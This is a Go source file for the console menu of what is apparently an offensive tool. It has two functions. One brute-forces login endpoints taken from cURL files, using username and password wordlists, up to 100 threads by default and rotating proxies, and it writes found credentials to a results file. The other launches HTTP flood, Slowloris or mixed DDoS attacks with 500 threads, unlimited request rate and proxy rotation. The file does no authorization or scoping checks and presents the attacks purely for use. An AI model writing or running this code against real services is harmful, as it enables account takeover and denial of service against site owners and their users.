package consolemenu

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/letgo/cracker"
	"github.com/letgo/curlparser"
	"github.com/letgo/ddos"
)

// attackWithCurl performs an attack using cURL configuration from a file
func (m *Menu) attackWithCurl() {
	reader := bufio.NewReader(os.Stdin)

	// Ask for cURL file path
	fmt.Print("\nEnter cURL config file path (default: cURL-Bruteforce.txt): ")
	curlFile, _ := reader.ReadString('\n')
	curlFile = strings.TrimSpace(curlFile)
	if curlFile == "" {
		curlFile = "cURL-Bruteforce.txt"
	}

	// Load cURL configurations from file
	curlConfigs, err := curlparser.LoadFromFile(curlFile)
	if err != nil {
		fmt.Printf("Error loading cURL config: %v\n", err)
		fmt.Println("Please make sure the file exists and contains valid cURL commands.")
		fmt.Println("\nExample cURL-Bruteforce.txt format:")
		fmt.Println("  curl -X POST https://example.com/login \\")
		fmt.Println("    -H 'Content-Type: application/json' \\")
		fmt.Println("    -d '{\"username\":\"test\",\"password\":\"test\"}'")
		fmt.Println()
		return
	}

	fmt.Printf("\n✓ Found %d cURL configuration(s)\n\n", len(curlConfigs))

	// Display found configurations
	fmt.Println("===== Found cURL Configurations =====")
	for i, config := range curlConfigs {
		fmt.Printf("[%d] %s %s\n", i+1, config.Method, config.URL)
		if config.ContentType != "" {
			fmt.Printf("    Content-Type: %s\n", config.ContentType)
		}
		if len(config.Headers) > 0 {
			fmt.Printf("    Headers: %d custom header(s)\n", len(config.Headers))
		}
		if config.Data != "" {
			// Extract field names
			usernameField, passwordField, fields := curlparser.ExtractFieldsFromData(config.Data, config.ContentType)
			fmt.Printf("    Detected fields: username='%s', password='%s'\n", usernameField, passwordField)
			if len(fields) > 2 {
				fmt.Printf("    Additional fields: %d\n", len(fields)-2)
			}
		}
		fmt.Println()
	}

	// Ask which config to use
	var selectedConfigs []*curlparser.CurlConfig
	if len(curlConfigs) == 1 {
		selectedConfigs = curlConfigs
		fmt.Println("Using the only available cURL configuration.")
	} else {
		fmt.Print("Choose option:\n")
		fmt.Print("  [1] Select specific configuration\n")
		fmt.Print("  [2] Use all configurations\n")
		fmt.Print("Enter choice (1 or 2): ")
		choice, _ := reader.ReadString('\n')
		choice = strings.TrimSpace(choice)

		if choice == "1" {
			fmt.Print("Enter configuration number: ")
			numStr, _ := reader.ReadString('\n')
			num, err := strconv.Atoi(strings.TrimSpace(numStr))
			if err != nil || num < 1 || num > len(curlConfigs) {
				fmt.Println("Invalid configuration number.")
				return
			}
			selectedConfigs = []*curlparser.CurlConfig{curlConfigs[num-1]}
		} else if choice == "2" {
			selectedConfigs = curlConfigs
		} else {
			fmt.Println("Invalid choice.")
			return
		}
	}

	// Get common attack parameters
	fmt.Println("\n===== Attack Configuration =====")

	// Ask if using proxy
	fmt.Print("Use proxy for attacks? (y/n, default: n): ")
	useProxyStr, _ := reader.ReadString('\n')
	useProxyStr = strings.TrimSpace(strings.ToLower(useProxyStr))
	useProxy := useProxyStr == "y" || useProxyStr == "yes"

	var proxyList []string
	var rotateProxy bool
	if useProxy {
		// Load proxies from proxy/proxy.txt
		proxies, err := m.loadValidProxies()
		if err != nil || len(proxies) == 0 {
			fmt.Printf("Warning: No valid proxies found in proxy/proxy.txt (%v)\n", err)
			fmt.Println("Please run 'Scrape Proxies' and 'Validate Proxies' first.")
			fmt.Print("Continue without proxy? (y/n): ")
			continueStr, _ := reader.ReadString('\n')
			if strings.TrimSpace(strings.ToLower(continueStr)) != "y" {
				return
			}
			useProxy = false
		} else {
			proxyList = proxies
			fmt.Printf("✓ Loaded %d valid proxies\n", len(proxyList))

			// Ask if rotate proxies
			fmt.Print("Rotate through proxies for each request? (y/n, default: y): ")
			rotateStr, _ := reader.ReadString('\n')
			rotateStr = strings.TrimSpace(strings.ToLower(rotateStr))
			rotateProxy = rotateStr != "n" && rotateStr != "no"

			if rotateProxy {
				fmt.Println("✓ Proxy rotation enabled")
			} else {
				fmt.Printf("✓ Using single proxy: %s\n", proxyList[0])
			}
		}
	}

	// Ask if using userlist or single username
	fmt.Print("Use userlist file? (y/n, default: n): ")
	useUserlist, _ := reader.ReadString('\n')
	useUserlist = strings.TrimSpace(strings.ToLower(useUserlist))

	var username, userlist string
	if useUserlist == "y" || useUserlist == "yes" {
		fmt.Print("Enter Userlist path (default: users.txt): ")
		userlist, _ = reader.ReadString('\n')
		userlist = strings.TrimSpace(userlist)
		if userlist == "" {
			userlist = "users.txt"
		}
	} else {
		fmt.Print("Enter Username: ")
		username, _ = reader.ReadString('\n')
		username = strings.TrimSpace(username)
		if username == "" {
			fmt.Println("Error: Username is required.")
			return
		}
	}

	fmt.Print("Enter Wordlist path (default: passwords.txt): ")
	wordlist, _ := reader.ReadString('\n')
	wordlist = strings.TrimSpace(wordlist)
	if wordlist == "" {
		wordlist = "passwords.txt"
	}

	fmt.Print("Enter Max Threads (default: 100): ")
	threadsStr, _ := reader.ReadString('\n')
	threadsStr = strings.TrimSpace(threadsStr)
	maxThreads := 100
	if threadsStr != "" {
		if t, err := strconv.Atoi(threadsStr); err == nil && t > 0 {
			maxThreads = t
		}
	}

	// Optional: Override success/failure detection
	fmt.Print("\nEnter Success HTTP codes (comma-separated, or press Enter for auto-detect): ")
	successCodesStr, _ := reader.ReadString('\n')
	successCodesStr = strings.TrimSpace(successCodesStr)
	var successCodes []int
	if successCodesStr != "" {
		codes := strings.Split(successCodesStr, ",")
		for _, codeStr := range codes {
			if code, err := strconv.Atoi(strings.TrimSpace(codeStr)); err == nil {
				successCodes = append(successCodes, code)
			}
		}
	}

	fmt.Print("Enter Success keywords in response (comma-separated, or press Enter to skip): ")
	successKeywordsStr, _ := reader.ReadString('\n')
	successKeywordsStr = strings.TrimSpace(successKeywordsStr)
	var successKeywords []string
	if successKeywordsStr != "" {
		successKeywords = strings.Split(successKeywordsStr, ",")
		for i := range successKeywords {
			successKeywords[i] = strings.TrimSpace(successKeywords[i])
		}
	}

	fmt.Print("Enter Failure keywords in response (comma-separated, or press Enter to skip): ")
	failureKeywordsStr, _ := reader.ReadString('\n')
	failureKeywordsStr = strings.TrimSpace(failureKeywordsStr)
	var failureKeywords []string
	if failureKeywordsStr != "" {
		failureKeywords = strings.Split(failureKeywordsStr, ",")
		for i := range failureKeywords {
			failureKeywords[i] = strings.TrimSpace(failureKeywords[i])
		}
	}

	// Start attacks
	fmt.Println("\n===== Starting Attacks =====")
	successCount := 0
	totalConfigs := len(selectedConfigs)

	for i, curlConfig := range selectedConfigs {
		fmt.Printf("\n[%d/%d] Attacking: %s %s\n", i+1, totalConfigs, curlConfig.Method, curlConfig.URL)

		// Convert cURL config to attack config
		attackConfig, err := curlConfig.ToAttackConfig()
		if err != nil {
			fmt.Printf("  ✗ Error converting config: %v\n", err)
			continue
		}

		// Apply user-provided parameters
		attackConfig.Username = username
		attackConfig.Userlist = userlist
		attackConfig.Wordlist = wordlist
		attackConfig.MaxThreads = maxThreads
		attackConfig.ShowAttempts = false

		// Apply proxy settings
		attackConfig.UseProxy = useProxy
		attackConfig.ProxyList = proxyList
		attackConfig.RotateProxy = rotateProxy

		if len(successCodes) > 0 {
			attackConfig.SuccessCodes = successCodes
		}
		if len(successKeywords) > 0 {
			attackConfig.SuccessKeywords = successKeywords
		}
		if len(failureKeywords) > 0 {
			attackConfig.FailureKeywords = failureKeywords
		}

		// Display configuration details
		fmt.Printf("  → Endpoint: %s\n", attackConfig.Endpoint)
		fmt.Printf("  → Method: %s\n", attackConfig.Method)
		fmt.Printf("  → Content-Type: %s\n", attackConfig.ContentType)
		fmt.Printf("  → Username field: %s\n", attackConfig.UsernameField)
		fmt.Printf("  → Password field: %s\n", attackConfig.PasswordField)
		fmt.Printf("  → Threads: %d, Timeout: %v\n", maxThreads, attackConfig.Timeout)
		if useProxy {
			fmt.Printf("  → Proxy: Enabled (%d proxies, rotation: %v)\n", len(proxyList), rotateProxy)
		}
		if len(attackConfig.CustomHeaders) > 0 {
			fmt.Printf("  → Custom headers: %d\n", len(attackConfig.CustomHeaders))
		}

		// Create password cracker
		pc := cracker.New(*attackConfig)

		// Load userlist
		if err := pc.LoadUserlist(); err != nil {
			fmt.Printf("  ✗ Error loading userlist: %v\n", err)
			continue
		}

		// Load wordlist
		if err := pc.LoadWordlist(); err != nil {
			fmt.Printf("  ✗ Error loading wordlist: %v\n", err)
			continue
		}

		// Calculate total combinations and warn if too large
		totalUsers := len(pc.GetUserlist())
		totalPasswords := len(pc.GetWordlist())
		totalCombinations := totalUsers * totalPasswords

		if userlist != "" {
			fmt.Printf("  → Testing %d users with %d passwords (%d total combinations)\n", totalUsers, totalPasswords, totalCombinations)
		} else {
			fmt.Printf("  → Testing 1 user with %d passwords\n", totalPasswords)
		}

		// Warn for large attacks
		if totalCombinations > 100000 {
			estimatedTime := float64(totalCombinations) / 1000.0 / 60.0 // Rough estimate at 1000/s
			fmt.Printf("  ⚠ WARNING: Large attack size! Estimated time: %.1f minutes\n", estimatedTime)
			fmt.Print("  Continue? (y/n): ")
			confirm, _ := reader.ReadString('\n')
			if strings.TrimSpace(strings.ToLower(confirm)) != "y" {
				fmt.Println("  Attack cancelled.")
				continue
			}
		}

		// Start attack
		found, credentials := pc.Start()

		if found {
			fmt.Printf("  ✓ Credentials found: %s\n", credentials)
			// Parse username:password
			parts := strings.SplitN(credentials, ":", 2)
			foundUsername := username
			foundPassword := credentials
			if len(parts) == 2 {
				foundUsername = parts[0]
				foundPassword = parts[1]
			}
			// Write result to file
			if err := m.writeResult(curlConfig.URL, foundUsername, foundPassword); err != nil {
				fmt.Printf("  ⚠ Warning: Failed to write result to file: %v\n", err)
			} else {
				fmt.Printf("  ✓ Result saved to results.txt\n")
			}
			successCount++
		} else {
			fmt.Printf("  ✗ Password not found.\n")
		}
	}

	// Summary
	fmt.Println("\n===== Attack Summary =====")
	fmt.Printf("Total configurations attacked: %d\n", totalConfigs)
	fmt.Printf("Successful credentials found: %d\n", successCount)
	if successCount > 0 {
		fmt.Printf("Results saved to results.txt\n")
	}
	fmt.Println()
}

// ddosAttack performs a DDoS attack using cURL configuration from a file
func (m *Menu) ddosAttack() {
	reader := bufio.NewReader(os.Stdin)

	// Ask for cURL file path
	fmt.Print("\nEnter cURL-DDOS config file path (default: cURL-DDOS.txt): ")
	curlFile, _ := reader.ReadString('\n')
	curlFile = strings.TrimSpace(curlFile)
	if curlFile == "" {
		curlFile = "cURL-DDOS.txt"
	}

	// Load cURL configurations from file
	ddosConfigs, err := curlparser.LoadDDoSFromFile(curlFile)
	if err != nil {
		fmt.Printf("Error loading cURL config: %v\n", err)
		fmt.Println("Please make sure the file exists and contains valid cURL commands.")
		fmt.Println("\nExample cURL-DDOS.txt format:")
		fmt.Println("  curl -X GET https://example.com/api/endpoint")
		fmt.Println("  curl -X POST https://example.com/api/data \\")
		fmt.Println("    -H 'Content-Type: application/json' \\")
		fmt.Println("    -d '{\"key\":\"value\"}'")
		fmt.Println()
		return
	}

	fmt.Printf("\n✓ Found %d target(s)\n\n", len(ddosConfigs))

	// Display found configurations
	fmt.Println("===== Target URLs =====")
	for i, config := range ddosConfigs {
		fmt.Printf("[%d] %s %s\n", i+1, config.Method, config.TargetURL)
		if config.ContentType != "" {
			fmt.Printf("    Content-Type: %s\n", config.ContentType)
		}
		if len(config.Headers) > 0 {
			fmt.Printf("    Custom Headers: %d\n", len(config.Headers))
		}
	}
	fmt.Println()

	// Ask which config to use
	var selectedConfigs []*ddos.DDoSConfig
	if len(ddosConfigs) == 1 {
		selectedConfigs = ddosConfigs
		fmt.Println("Using the only available target.")
	} else {
		fmt.Print("Choose option:\n")
		fmt.Print("  [1] Select specific target\n")
		fmt.Print("  [2] Attack all targets simultaneously\n")
		fmt.Print("Enter choice (1 or 2): ")
		choice, _ := reader.ReadString('\n')
		choice = strings.TrimSpace(choice)

		if choice == "1" {
			fmt.Print("Enter target number: ")
			numStr, _ := reader.ReadString('\n')
			num, err := strconv.Atoi(strings.TrimSpace(numStr))
			if err != nil || num < 1 || num > len(ddosConfigs) {
				fmt.Println("Invalid target number.")
				return
			}
			selectedConfigs = []*ddos.DDoSConfig{ddosConfigs[num-1]}
		} else if choice == "2" {
			selectedConfigs = ddosConfigs
		} else {
			fmt.Println("Invalid choice.")
			return
		}
	}

	// Get DDoS configuration
	fmt.Println("\n===== DDoS Configuration =====")

	// Ask if using proxy
	fmt.Print("\nUse proxy for attacks? (y/n, default: n): ")
	useProxyStr, _ := reader.ReadString('\n')
	useProxyStr = strings.TrimSpace(strings.ToLower(useProxyStr))
	useProxy := useProxyStr == "y" || useProxyStr == "yes"

	var proxyList []string
	var rotateProxy bool
	if useProxy {
		// Load proxies from proxy/proxy.txt
		proxies, err := m.loadValidProxies()
		if err != nil || len(proxies) == 0 {
			fmt.Printf("Warning: No valid proxies found in proxy/proxy.txt (%v)\n", err)
			fmt.Println("Please run 'Scrape Proxies' and 'Validate Proxies' first.")
			fmt.Print("Continue without proxy? (y/n): ")
			continueStr, _ := reader.ReadString('\n')
			if strings.TrimSpace(strings.ToLower(continueStr)) != "y" {
				return
			}
			useProxy = false
		} else {
			proxyList = proxies
			fmt.Printf("✓ Loaded %d valid proxies\n", len(proxyList))

			// Ask if rotate proxies
			fmt.Print("Rotate through proxies for each request? (y/n, default: y): ")
			rotateStr, _ := reader.ReadString('\n')
			rotateStr = strings.TrimSpace(strings.ToLower(rotateStr))
			rotateProxy = rotateStr != "n" && rotateStr != "no"

			if rotateProxy {
				fmt.Println("✓ Proxy rotation enabled")
			} else {
				fmt.Printf("✓ Using single proxy: %s\n", proxyList[0])
			}
		}
	}

	// Attack Mode
	fmt.Println("\nSelect Attack Mode:")
	fmt.Println("  [1] HTTP Flood     - Maximum concurrent HTTP requests (Default)")
	fmt.Println("  [2] Slowloris      - Hold connections open with partial headers")
	fmt.Println("  [3] Mixed          - Combination of flood (70%) and slowloris (30%)")
	fmt.Print("Enter choice (1-3, default: 1): ")
	modeChoice, _ := reader.ReadString('\n')
	modeChoice = strings.TrimSpace(modeChoice)

	var attackMode ddos.AttackMode
	switch modeChoice {
	case "2":
		attackMode = ddos.ModeSlowloris
		fmt.Println("✓ Slowloris mode selected")
	case "3":
		attackMode = ddos.ModeMixed
		fmt.Println("✓ Mixed mode selected (70% flood, 30% slowloris)")
	default:
		attackMode = ddos.ModeFlood
		fmt.Println("✓ HTTP Flood mode selected")
	}

	// Number of threads
	fmt.Print("\nEnter number of threads (default: 500): ")
	threadsStr, _ := reader.ReadString('\n')
	threadsStr = strings.TrimSpace(threadsStr)
	maxThreads := 500
	if threadsStr != "" {
		if t, err := strconv.Atoi(threadsStr); err == nil && t > 0 {
			maxThreads = t
		}
	}

	// Duration
	fmt.Print("Enter attack duration in seconds (default: 60): ")
	durationStr, _ := reader.ReadString('\n')
	durationStr = strings.TrimSpace(durationStr)
	duration := 60 * time.Second
	if durationStr != "" {
		if d, err := strconv.Atoi(durationStr); err == nil && d > 0 {
			duration = time.Duration(d) * time.Second
		}
	}

	// Rate limit
	fmt.Print("Enter rate limit (requests/sec, 0 = unlimited, default: 0): ")
	rateLimitStr, _ := reader.ReadString('\n')
	rateLimitStr = strings.TrimSpace(rateLimitStr)
	rateLimit := 0
	if rateLimitStr != "" {
		if r, err := strconv.Atoi(rateLimitStr); err == nil && r >= 0 {
			rateLimit = r
		}
	}

	// Connection reuse
	fmt.Print("Reuse connections? (y/n, default: y): ")
	reuseStr, _ := reader.ReadString('\n')
	reuseStr = strings.TrimSpace(strings.ToLower(reuseStr))
	reuseConnections := reuseStr != "n" && reuseStr != "no"

	// Timeout
	fmt.Print("Enter request timeout in seconds (default: 5): ")
	timeoutStr, _ := reader.ReadString('\n')
	timeoutStr = strings.TrimSpace(timeoutStr)
	timeout := 5 * time.Second
	if timeoutStr != "" {
		if t, err := strconv.Atoi(timeoutStr); err == nil && t > 0 {
			timeout = time.Duration(t) * time.Second
		}
	}

	// Apply configuration to all selected configs
	for _, config := range selectedConfigs {
		config.AttackMode = attackMode
		config.MaxThreads = maxThreads
		config.Duration = duration
		config.RateLimit = rateLimit
		config.ReuseConnections = reuseConnections
		config.Timeout = timeout
		// Apply proxy settings
		config.UseProxy = useProxy
		config.ProxyList = proxyList
		config.RotateProxy = rotateProxy
	}

	// Summary before starting
	fmt.Println("\n" + strings.Repeat("=", 70))
	fmt.Println("                    ATTACK CONFIGURATION SUMMARY")
	fmt.Println(strings.Repeat("=", 70))
	fmt.Printf("Targets:           %d\n", len(selectedConfigs))
	fmt.Printf("Attack Mode:       %s\n", attackMode)
	fmt.Printf("Threads:           %d\n", maxThreads)
	fmt.Printf("Duration:          %s\n", duration)
	if rateLimit > 0 {
		fmt.Printf("Rate Limit:        %d req/s\n", rateLimit)
	} else {
		fmt.Printf("Rate Limit:        Unlimited\n")
	}
	fmt.Printf("Reuse Connections: %v\n", reuseConnections)
	fmt.Printf("Request Timeout:   %s\n", timeout)
	if useProxy {
		fmt.Printf("Proxy:             Enabled (%d proxies, rotation: %v)\n", len(proxyList), rotateProxy)
	} else {
		fmt.Printf("Proxy:             Disabled\n")
	}
	fmt.Println(strings.Repeat("=", 70))

	// Final confirmation
	fmt.Print("\nStart DDoS attack? (y/n): ")
	startConfirm, _ := reader.ReadString('\n')
	startConfirm = strings.TrimSpace(strings.ToLower(startConfirm))
	if startConfirm != "y" {
		fmt.Println("Attack cancelled.")
		return
	}

	// Create context for graceful shutdown
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Start attacks
	fmt.Println("\n" + strings.Repeat("=", 70))
	fmt.Println("                    DDoS ATTACK IN PROGRESS")
	fmt.Println(strings.Repeat("=", 70))
	fmt.Println("Press Ctrl+C to stop the attack...")
	fmt.Println()

	var attacks []*ddos.DDoSAttack
	var wg sync.WaitGroup

	// Progress display
	progressMutex := sync.Mutex{}
	lastStats := make(map[int]ddos.AttackStats)

	for i, config := range selectedConfigs {
		// Create progress callback
		idx := i
		config.OnProgress = func(stats ddos.AttackStats) {
			progressMutex.Lock()
			lastStats[idx] = stats
			progressMutex.Unlock()
		}

		attack := ddos.New(*config)
		attacks = append(attacks, attack)

		wg.Add(1)
		go func(a *ddos.DDoSAttack) {
			defer wg.Done()
			if err := a.Start(ctx); err != nil {
				fmt.Printf("Error starting attack: %v\n", err)
				return
			}
			a.Wait()
		}(attack)
	}

	// Display progress in real-time
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()

		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				progressMutex.Lock()
				// Clear previous output and display stats
				fmt.Print("\r\033[K") // Clear line

				var totalSent, totalSuccess, totalFailed int64
				var totalRPS float64

				for _, stats := range lastStats {
					totalSent += stats.RequestsSent
					totalSuccess += stats.RequestsSuccess
					totalFailed += stats.RequestsFailed
					totalRPS += stats.RequestsPerSec
				}

				if len(lastStats) > 0 {
					elapsed := time.Duration(0)
					for _, stats := range lastStats {
						if stats.ElapsedTime > elapsed {
							elapsed = stats.ElapsedTime
						}
					}
					remaining := duration - elapsed
					if remaining < 0 {
						remaining = 0
					}

					fmt.Printf("⏱  Elapsed: %s | Remaining: %s | Sent: %d | Success: %d | Failed: %d | RPS: %.0f",
						ddos.FormatDuration(elapsed),
						ddos.FormatDuration(remaining),
						totalSent,
						totalSuccess,
						totalFailed,
						totalRPS)
				}
				progressMutex.Unlock()
			}
		}
	}()

	// Wait for all attacks to complete
	wg.Wait()

	// Final stats
	fmt.Println("\n\n" + strings.Repeat("=", 70))
	fmt.Println("                    ATTACK COMPLETE")
	fmt.Println(strings.Repeat("=", 70))

	var grandTotal ddos.AttackStats
	for i, attack := range attacks {
		stats := attack.GetStats()
		grandTotal.RequestsSent += stats.RequestsSent
		grandTotal.RequestsSuccess += stats.RequestsSuccess
		grandTotal.RequestsFailed += stats.RequestsFailed
		grandTotal.BytesSent += stats.BytesSent
		grandTotal.BytesReceived += stats.BytesReceived

		fmt.Printf("\n[Target %d] %s %s\n", i+1, selectedConfigs[i].Method, selectedConfigs[i].TargetURL)
		fmt.Printf("  Requests Sent:     %d\n", stats.RequestsSent)
		fmt.Printf("  Successful:        %d\n", stats.RequestsSuccess)
		fmt.Printf("  Failed:            %d\n", stats.RequestsFailed)
		fmt.Printf("  Data Sent:         %s\n", ddos.FormatBytes(stats.BytesSent))
		fmt.Printf("  Data Received:     %s\n", ddos.FormatBytes(stats.BytesReceived))
		fmt.Printf("  Avg Response Time: %s\n", stats.AvgResponseTime)
		fmt.Printf("  Requests/sec:      %.2f\n", stats.RequestsPerSec)
	}

	if len(attacks) > 1 {
		fmt.Println("\n" + strings.Repeat("-", 70))
		fmt.Println("GRAND TOTAL:")
		fmt.Printf("  Total Requests:    %d\n", grandTotal.RequestsSent)
		fmt.Printf("  Total Successful:  %d\n", grandTotal.RequestsSuccess)
		fmt.Printf("  Total Failed:      %d\n", grandTotal.RequestsFailed)
		fmt.Printf("  Total Data Sent:   %s\n", ddos.FormatBytes(grandTotal.BytesSent))
		fmt.Printf("  Total Data Recv:   %s\n", ddos.FormatBytes(grandTotal.BytesReceived))
	}

	fmt.Println(strings.Repeat("=", 70))
	fmt.Println()
}
